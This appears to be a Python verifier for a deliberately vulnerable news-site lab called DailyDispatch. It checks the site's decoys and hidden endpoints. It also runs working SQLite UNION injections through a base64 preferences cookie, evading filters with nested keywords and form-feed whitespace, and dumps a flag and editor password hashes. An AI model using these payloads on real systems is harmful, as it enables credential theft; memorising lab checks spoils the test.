#!/usr/bin/env python3
"""Verifier for DailyDispatch. Usage: verify_dailydispatch.py http://host:port  (prints PASS/FAIL only)."""
import base64
import json
import os
import re
import sys

import requests

ROOT = sys.argv[1].rstrip("/")
BASE = ROOT + "/news"
FF = "\u000c"  # form feed: valid SQLite whitespace, sent via the JSON \u escape so it only appears after decoding
HIDDEN = ["popular", "weekly"]
HINTS = re.compile(r"\b(sql\w*|inject\w*|vulnerab\w*|flag|lab|hint|debug|mysql|mssql)\b", re.I)
T = 15
VER = re.compile(r"\b\d+\.\d+\.\d+\b")


def step(name, ok):
    print(f"{name}: {'PASS' if ok else 'FAIL'}")


def get(path, **kw):
    return requests.get(BASE + path, timeout=T, **kw)


def cookie(ed, dm="standard"):
    # json.dumps escapes control characters as \uXXXX, which is how the form feed survives the JSON layer
    return base64.urlsafe_b64encode(json.dumps({"ed": ed, "dm": dm}).encode()).decode()


def side(ed, dm="standard"):
    r = requests.get(BASE + "/", cookies={"dd_prefs": cookie(ed, dm)}, timeout=T)
    blk = r.text.split("Top stories for your edition")[1].split("Newsletter")[0]
    return r, [m.group(1) for m in re.finditer(r"<h3><a [^>]*>(.*?)</a></h3>", blk, re.S)], blk


def union(expr, tail="", sep=FF):
    """Nested keywords defeat the single-pass strip; a non-space whitespace character defeats the whitespace check."""
    return f"x'{sep}UNUNIONION{sep}SELSELECTECT{sep}1,{expr},3,4,5{sep}{tail}--"


def crawl():
    seen, todo, pages = set(), ["/news/"], {}
    while todo and len(seen) < 300:
        u = todo.pop()
        if u in seen:
            continue
        seen.add(u)
        r = requests.get(ROOT + u, timeout=T)
        pages[u] = r.text
        for h in re.findall(r"""(?:href|action)=["']([^"']+)["']""", r.text):
            h = h.replace("&amp;", "&")
            if h.startswith("/news") and h not in seen:
                todo.append(h)
    return pages


def visible(html):
    html = re.sub(r"<style.*?</style>", " ", html, flags=re.S)
    return re.sub(r"<[^>]+>", " ", html)


def main():
    _, base_titles, _ = side("intl")
    step("baseline-stories", len(base_titles) == 6)
    step("site-pages-ok", all(get(p).status_code == 200 for p in ("/", "/about", "/contact", "/subscribe", "/archive", "/section?cat=world", "/article?id=1", "/author?name=Ana+Moreno")))
    step("no-login-pages", all(get(p, allow_redirects=False).status_code in (403, 404) for p in ("/staff/login", "/login", "/register", "/account")))
    step("admin-static-403", all(get(p).status_code == 403 for p in ("/admin", "/backup.zip", "/db.sqlite")))
    r = get("/")
    step("only-prefs-cookie", set(r.cookies.keys()) == {"dd_prefs"})

    # filters
    _, t, blk = side("x' UNION SELECT 1,2,3,4,5--")
    step("filter-whitespace-fallback", t == base_titles)
    _, t, blk = side("x'/**/UNION/**/SELECT/**/1,2,3,4,5--")
    step("filter-keyword-strip", "not showing" in blk)

    # cookie injection (SQLite, UNION, in-band)
    _, t, _ = side(union("sqlite_version()"))
    step("cookie-version", bool(t and re.fullmatch(r"\d+\.\d+\.\d+", t[0])))
    _, t, _ = side(union("group_concat(name)", "FRFROMOM" + FF + "sqlite_master" + FF + "WHWHEREERE" + FF + "type='table'"))
    step("cookie-tables", bool(t and "wire_services" in t[0] and "editors" in t[0]))
    _, t, _ = side(union("group_concat(name)", "FRFROMOM" + FF + "pragma_table_info('wire_services')"))
    step("cookie-columns", bool(t and "api_key" in t[0]))
    _, t, _ = side(union("sql", "FRFROMOM" + FF + "sqlite_master" + FF + "WHWHEREERE" + FF + "name='wire_services'"))
    step("cookie-columns-schema-sql", bool(t and "api_key" in t[0]))
    _, t, _ = side(union("group_concat(provider||':'||api_key,'|')", "FRFROMOM" + FF + "wire_services"))
    step("cookie-dump-flag", bool(t and re.search(r"FLAG\{dailydispatch_[a-z_0-9]+\}", t[0])))
    _, t, _ = side(union("group_concat(username||':'||password_hash,'|')", "FRFROMOM" + FF + "editors"))
    step("cookie-dump-editors", bool(t and ":" in t[0] and len(t[0]) > 100))
    _, t, _ = side(union("sqlite_version()", sep="/**/"))
    step("cookie-comment-whitespace-bypass", bool(t and re.fullmatch(r"\d+\.\d+\.\d+", t[0])))
    r = requests.get(BASE + "/", cookies={"dd_prefs": cookie("x'")}, timeout=T)
    step("cookie-quote-breaks-sidebar", r.status_code == 200 and "not showing" in r.text)

    # hidden endpoints: found by fuzzing only, safe
    pages = crawl()
    blob = "\n".join(pages.values())
    step("hidden-endpoint-not-404", all(get("/" + h).status_code == 200 for h in HIDDEN))
    step("nonexistent-is-404", get("/zzqxnotthere9").status_code == 404)
    for h in HIDDEN:
        step(f"hidden-{h}-not-linked", ("/news/" + h) not in blob.lower() and h not in visible(blob).lower())
    step("hidden-param-not-linked", not re.search(r"[?&;](section|issue)=", blob))
    step("hidden-not-in-robots-sitemap", all(requests.get(ROOT + p, timeout=T).status_code == 404 for p in ("/robots.txt", "/sitemap.xml", "/news/robots.txt", "/news/sitemap.xml")))
    b1, p1, p2 = get("/popular"), get("/popular", params={"section": "world"}), get("/popular", params={"zzparam": "world"})
    step("hidden-popular-param-distinguishable", len(p1.text) != len(b1.text) and len(p2.text) == len(b1.text) and "Most read in" in p1.text)
    b1, p1, p2 = get("/weekly"), get("/weekly", params={"issue": "44"}), get("/weekly", params={"zzparam": "44"})
    step("hidden-weekly-param-distinguishable", len(p1.text) != len(b1.text) and len(p2.text) == len(b1.text) and "Week 44" in p1.text)
    wl = "/usr/share/wordlists/dirb/common.txt"
    if os.path.exists(wl):
        words = set(open(wl, errors="ignore").read().split())
        step("hidden-endpoints-in-common-wordlist", all(h in words for h in HIDDEN))
    wl = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
    if os.path.exists(wl):
        words = set(open(wl, errors="ignore").read().split())
        step("hidden-params-in-burp-wordlist", "section" in words and "issue" in words)
    step("no-hint-words", not HINTS.search(visible(blob)) and not re.search(r"lab", visible(blob), re.I))
    step("no-html-comments", "<!--" not in blob)
    step("cookie-visible-in-response", "dd_prefs" in requests.get(BASE + "/", timeout=T).headers.get("Set-Cookie", ""))

    # decoys: visible rabbit holes + hidden decoys must not be injectable
    pv = "x' UNION SELECT 1,sqlite_version(),3,4,5--"
    probes = {
        "decoy-section-cat": ("/section", {"cat": pv}),
        "decoy-article-id": ("/article", {"id": "1 UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10,11"}),
        "decoy-search-q": ("/search", {"q": pv}),
        "decoy-search-plain": ("/search", {"q": "UNION SELECT sqlite_version()"}),
        "decoy-archive-year": ("/archive", {"year": pv}),
        "decoy-author-name": ("/author", {"name": pv}),
        "decoy-feed-cat": ("/feed.xml", {"cat": pv}),
        "decoy-hidden-popular": ("/popular", {"section": pv}),
        "decoy-hidden-weekly": ("/weekly", {"issue": "1 UNION SELECT sqlite_version()"}),
    }
    for name, (p, params) in probes.items():
        r = get(p, params=params)
        step(name, r.status_code == 200 and not VER.search(visible(r.text)) and "FLAG{" not in r.text)
    step("decoy-section-quote-no-section", "No such section" in get("/section", params={"cat": "world' OR '1'='1"}).text)
    step("decoy-author-quote-no-author", "No author" in get("/author", params={"name": "Ana Moreno' OR '1'='1"}).text)
    step("decoy-archive-year-strict", "stories from" not in get("/archive", params={"year": "2026' OR '1'='1"}).text)
    step("decoy-article-id-strict", "could not be found" in get("/article", params={"id": "1 OR 1=1"}).text)
    step("decoy-search-quote-rejected", "unsupported characters" in get("/search", params={"q": "a'b"}).text)
    r = requests.get(BASE + "/", cookies={"dd_prefs": cookie("intl", "' OR 1=1--")}, timeout=T)
    step("decoy-display-mode-whitelist", r.status_code == 200 and 'class="standard"' in r.text)
    r = requests.get(BASE + "/article", params={"id": 1}, cookies={"dd_prefs": cookie(union("sqlite_version()"))}, timeout=T)
    step("decoy-article-ignores-edition-cookie", r.status_code == 200 and not VER.search(visible(r.text)))
    step("decoy-contact-form", "received" in requests.post(BASE + "/contact", data={"name": "x' OR 1=1--", "email": "a@b.co", "message": "' UNION SELECT 1--"}, timeout=T).text)
    step("decoy-subscribe-form", "valid email" in requests.post(BASE + "/subscribe", data={"email": "x' OR 1=1--", "plan": "digital"}, timeout=T).text)


main()
